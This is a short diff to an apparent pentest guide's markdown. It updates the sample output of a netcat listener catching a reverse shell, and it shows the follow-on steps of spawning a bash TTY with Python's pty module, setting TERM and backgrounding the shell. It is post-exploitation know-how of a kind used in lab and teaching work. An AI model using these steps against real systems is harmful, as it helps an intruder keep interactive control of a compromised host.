@@ -33,9 +33,11 @@ again.
 
 ```text
 adversary@kali:~# nc -lvnp <port-number>
-listening on [any] <port-number>
-connect to [...] from (UNKNOWN) [...]
-
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::<port-number>
+Ncat: Listening on 0.0.0.0:<port-number>
+Ncat: Connection from <target IP address>.
+Ncat: Connection from <target IP address>:<target port-number>.
 python -c 'import pty;pty.spawn("/bin/bash")'
 shell@linux:~$ export TERM=xterm
 shell@linux:~$ ^Z
